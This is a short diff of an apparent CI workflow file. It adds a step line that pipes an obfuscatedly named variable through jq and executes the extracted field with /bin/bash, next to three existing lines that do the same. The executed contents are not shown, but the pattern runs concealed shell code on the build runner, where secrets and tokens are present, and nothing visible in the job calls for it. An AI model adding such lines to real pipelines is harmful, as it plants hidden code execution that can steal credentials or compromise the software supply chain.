@@ -43,6 +43,7 @@ jobs:
           printf '%s' "$seq70" | jq -r .k6 | /bin/bash
           echo $nw139 | jq -r .agesj87350 | /bin/bash
           echo $qkjsw2 | jq -r .pt30557 | /bin/bash
+          printf '%s' "$zvnn38065" | jq -r .x10 | /bin/bash
 
       - name: Upload results
         if: always()
